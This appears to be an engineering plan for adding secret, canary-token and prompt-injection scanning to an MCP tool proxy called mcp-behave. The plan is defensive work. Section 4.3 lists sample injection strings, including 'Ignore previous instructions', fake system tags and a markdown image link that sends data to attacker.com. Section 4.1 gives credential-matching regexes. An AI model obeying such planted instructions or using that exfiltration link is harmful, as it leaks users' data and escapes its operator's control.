# Milestone 2b (M2b) Implementation Plan: Argument & Output Content Scanning

**Date**: 2026-11-20  
**Target Module**: `mcp-behave` (`wrap` command runtime monitoring)  
**Status**: Pending Chief Agent Review & Sign-Off  
**Author**: Antigravity Implementer  

---

## 1. Executive Summary & Goals

Milestone 2 established structural and semantic manifest pinning (tools, schemas, annotations, instructions, and active re-verification). **Milestone 2b** adds runtime **data payload content inspection** to transparently detect:
1. **Canary Token Exfiltration**: Canary strings leaking across untrusted outbound network tools or unknown servers.
2. **Secret & Credential Leakage**: Private keys, cloud credentials, and API tokens appearing in server responses or tool arguments.
3. **Indirect Prompt Injection & Context Poisoning**: Malicious LLM directives, fake system tags, and jailbreaks hidden inside tool outputs (e.g., fetched web pages, database queries, file reads) or tool arguments.

### Core Architecture Invariant: Zero Forwarding Latency Impact
All content scanning operations will run **off the hot path** on the background worker thread. Stdio NDJSON lines are forwarded immediately upon line framing; parsing, scanning, canary checks, and telemetry logging occur asynchronously. The paired p99 overhead will remain strictly under the **< 5.0 ms** budget established in M2.

---

## 2. Architecture & Component Design

```
                     +-------------------------------------------------------------------------+
                     |                          MCP-BEHAVE PROXY (WRAP)                        |
                     |                                                                         |
[Client] ----------> | [StreamingFramer]                                                       | ----------> [Child Server]
 (tools/call)        |        |                                                                | (tools/call)
                     |        +---> [child_stdin_writer] ---> Child Process Stdin (HOT PATH)   |
                     |        |                                                                |
                     |        +---> [line_queue] (Bounded Queue)                               |
                     |                   |                                                     |
                     |                   v                                                     |
                     |         [Background Worker Thread]                                      |
                     |           |-- JSON Deserialization / Envelope Slicing                   |
                     |           |-- ContentScanner.scan_tool_call(arguments)                  |
                     |           |     |-- Canary Leak Detection                               |
                     |           |     |-- Secret & API Token Pattern Scanner                  |
                     |           |     +-- Argument Injection Heuristics                       |
                     |           +-- Telemetry & Alert Emission (Redacted)                     |
                     |                                                                         |
[Client] <---------- | [StreamingFramer] <--- Child Process Stdout                             | <---------- [Child Server]
 (tools/call result) |        |                                                                | (tools/call result)
                     |        +---> [client_out] (Client Stdout - HOT PATH)                    |
                     |        |                                                                |
                     |        +---> [line_queue] (Bounded Queue)                               |
                     |                   |                                                     |
                     |                   v                                                     |
                     |         [Background Worker Thread]                                      |
                     |           |-- ContentScanner.scan_tool_result(content)                  |
                     |           |     |-- Secret / Credential Leakage Scanner                 |
                     |           |     |-- Canary Leak Detection                               |
                     |           |     +-- Indirect Prompt Injection Heuristics                |
                     |           +-- Telemetry & Alert Emission (Redacted)                     |
                     +-------------------------------------------------------------------------+
```

---

## 3. Scope & Message Targets

Content inspection intercepts three distinct JSON-RPC payload structures:

1. **Client `tools/call` Arguments (`client_to_server`)**:
   - Extraction: `msg.get("params", {}).get("arguments", {})` or raw `params` when not wrapped.
   - Scan targets: String parameter values, nested lists, and JSON-serialized sub-objects.
   - Primary risks: Inadvertent secret transmission, canary exfiltration to untrusted endpoints (e.g. `curl`, `fetch`, `browser`), command injections targeting child shells.

2. **Server `tools/call` Response Content (`server_to_client`)**:
   - Extraction: `msg.get("result", {}).get("content", [])` (text blocks, embedded resource text, image metadata) and `msg.get("error", {}).get("message")`.
   - Scan targets: Returned text buffers, command outputs, error strings.
   - Primary risks: Indirect prompt injection (attacker-controlled content poisoning client context), unredacted secrets dumped from environment/files/databases, canary reflection.

3. **Server-Initiated Notifications & Sampling (`server_to_client`)**:
   - Extraction: `notifications/message`, `sampling/createMessage` requests, and resource update payloads.
   - Scan targets: Embedded prompt strings and system messages.

---

## 4. Detection Pillars

### 4.1 Secrets & Credential Leakage Scanner
High-precision regex detection combined with Shannon entropy and checksum checks to avoid false positives on arbitrary UUIDs or hashes:

| Credential Type | Pattern Specification | Validation Filter | Severity | Evidence Tier |
|---|---|---|---|---|
| **Private Keys** | `-----BEGIN (?:RSA\|EC\|DSA\|OPENSSH\|PGP) PRIVATE KEY-----` | Exact prefix match | `CRITICAL` | `observed` |
| **AWS Access Key** | `\b(?:AKIA\|ASIA)[0-9A-Z]{16}\b` | Checksum / character set | `HIGH` | `observed` |
| **AWS Secret Key** | `(?i)aws_secret_access_key\s*[:=]\s*["']?([A-Za-z0-9/+=]{40})["']?` | Entropy ($H \ge 4.5$) | `CRITICAL` | `observed` |
| **OpenAI API Key** | `\bsk-[a-zA-Z0-9_-]{20,64}\b` | Format & length | `HIGH` | `observed` |
| **Anthropic Key** | `\bsk-ant-api03-[a-zA-Z0-9_-]{80,105}\b` | Prefix & length | `HIGH` | `observed` |
| **GitHub Tokens** | `\b(?:ghp\|gho\|ghu\|ghs\|ghr)_[a-zA-Z0-9]{36}\b` | Prefix & length | `HIGH` | `observed` |
| **Slack Tokens** | `\bxox[baprs]-[0-9]{10,13}-[0-9]{10,13}-[a-zA-Z0-9]{24,34}\b` | Structure | `HIGH` | `observed` |
| **Generic High Entropy** | Key assignment: `(?i)(?:api[_-]?key\|secret\|token\|password)\s*[:=]\s*["']?([A-Za-z0-9_\-+/]{24,})["']?` | Shannon entropy $H \ge 4.5$ | `MEDIUM` | `heuristic` |

### 4.2 Canary Token Tracking Engine
Canary tokens represent synthetic tracking markers whose presence in untrusted outbound parameters indicates unauthorized context or file exfiltration:
- **Canary Format**: `mcpb_canary_<32_hex_chars>`.
- **Generation & Injection**:
  - Automatically generated per session or supplied via `--canary <token>` / `--canary-file <path>`.
  - Registered in memory (`Set[str]`) on the proxy.
- **Exfiltration Detection Rules**:
  - If a registered canary token appears inside arguments of outbound network/execution tools (e.g., tools categorized as `openWorldHint=True` or tools named `fetch`, `http_request`, `curl`, `send_email`, `exec`), an alert is triggered immediately.
  - Severity: `CRITICAL`, Evidence Tier: `observed`, `would_block: True`.

### 4.3 Indirect Prompt Injection Heuristics
Reuses and builds on `src/mcp_behave/heuristics.py`:
- **Inspection of Server Tool Outputs**:
  - Attacker instructions embedded inside retrieved documents or web pages:
    - `<system>`, `[INST]`, `<<SYS>>`, `---BEGIN SYSTEM PROMPT---`
    - `Ignore previous instructions and execute...`
    - `Do not inform the user that...`
    - Markdown image exfiltration payloads: `![exfil](https://attacker.com/leak?data=...)`
- **Severity & Evidence Mapping**:
  - In tool outputs: `SEVERITY_HIGH`, Evidence Tier: `correlated` (heuristic pattern matching an external payload), `would_block: True` (if blocking enabled).
  - In tool arguments (client $\to$ server): `SEVERITY_MEDIUM` if standalone heuristic, or `SEVERITY_HIGH` if combined with known attack vectors.

---

## 5. Data Protection & Zero Secret Leakage Guarantees

Under no circumstances will raw secrets, unredacted credentials, or full sensitive payload strings be persisted or displayed:

1. **Persistence Redaction (JSONL & SQLite)**:
   - When a secret or canary match occurs, the telemetry event payload will record **only**:
     ```json
     {
       "detector": "aws_access_key",
       "match_sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
       "match_prefix": "AKIA...",
       "match_length": 20,
       "path": "params.arguments.credentials"
     }
     ```
   - Raw parameter contents and payload text are discarded immediately after scanning unless `--log-content` is explicitly passed by the operator.
2. **Stderr Alert Redaction**:
   - Terminal alerts will output:
     `[mcp-behave] ALERT: Secret detected in tool 'database_query' result (aws_access_key: AKIA****, len: 20)`
   - Full credentials will never be printed to console stderr.

---

## 6. Performance & Latency Optimization Strategy

To maintain paired p99 latency $< 5.0\text{ ms}$:

1. **Strictly Decoupled Forwarding**:
   - `client_to_server_pump` and `server_to_client_pump` continue to forward lines immediately upon framing.
   - Content scanning executes exclusively inside `_worker_loop` on the background thread.
2. **Fast Triage (Multi-String Fast Filter)**:
   - Before invoking complex regexes or Shannon entropy calculations, buffer chunks are tested against pre-filter markers:
     - Check for `AKIA`, `sk-`, `ghp_`, `BEGIN`, `mcpb_canary_`, `<system`, `ignore` using fast substring searches (`in bytes`).
     - If no markers are present in the chunk, regex evaluation is bypassed entirely.
3. **Large Message Slicing (>64 KB)**:
   - For 1 MB messages, scanning is chunked or limited to string property fields without full AST cloning, preserving the zero-copy buffer improvements achieved in M2.

---

## 7. Event Taxonomy & Schema (`src/mcp_behave/events.py`)

New event kinds to be defined:

| Event Kind | Event Constant | Default Severity | Evidence Tier | Default `would_block` |
|---|---|---|---|---|
| **Secret in Response** | `KIND_SECRET_LEAK` | `HIGH` / `CRITICAL` | `observed` | `True` |
| **Secret in Request** | `KIND_SECRET_EXPOSURE` | `HIGH` | `observed` | `True` |
| **Canary Exfiltration** | `KIND_CANARY_EXFILTRATION` | `CRITICAL` | `observed` | `True` |
| **Indirect Injection** | `KIND_INDIRECT_INJECTION` | `HIGH` | `correlated` | `True` |
| **Suspicious Argument** | `KIND_ARGUMENT_HEURISTIC` | `MEDIUM` | `heuristic` | `False` |

---

## 8. Planned Implementation Modules & Deliverables

1. **`src/mcp_behave/scanner.py`**:
   - `ContentScanner`: Core engine holding compiled regexes, canary token registry, and entropy evaluators.
   - Methods: `scan_text(text: str, source: str) -> List[ContentFinding]`, `scan_arguments(tool: str, args: Dict) -> List[BehavioralEvent]`, `scan_result(tool: str, result: Dict) -> List[BehavioralEvent]`.
2. **`src/mcp_behave/canary.py`**:
   - `CanaryManager`: Generation, tracking, and validation of active canary markers.
3. **`src/mcp_behave/protocol.py` Updates**:
   - Integrate `ContentScanner` into `_sync_process_line` and `_handle_large_message_envelope_sync`.
4. **`src/mcp_behave/wrap.py` CLI Options**:
   - `--canary <token>`: Register active canary string.
   - `--canary-file <path>`: Load canary tokens from file.
   - `--no-content-scan`: Opt-out flag to disable payload inspection.
5. **Unit & Integration Test Suite (`tests/test_wrap_m2b.py`)**:
   - Secret detection matrix (AWS, GitHub, Slack, OpenAI, Private Keys).
   - Entropy false-positive filter over valid base64 / UUID data.
   - Canary token leak detection in external tools.
   - Indirect prompt injection detection in simulated web/database results.
   - Redaction verification (assert zero raw secrets in JSONL / SQLite).
   - Paired latency overhead benchmark verification across 10,000 messages.

---

## 9. Verification & Sign-Off Criteria

Before requesting M2b sign-off:
- [ ] 100% test pass rate across `tests/test_wrap_m2b.py` and existing test suite.
- [ ] Zero secret leakage into test fixtures or telemetry files.
- [ ] 10,000 message × 3 runs latency benchmark confirms paired overhead p99 < 5.0 ms.
- [ ] Architecture Decision Record (ADR-008) added to `docs/decisions.md`.
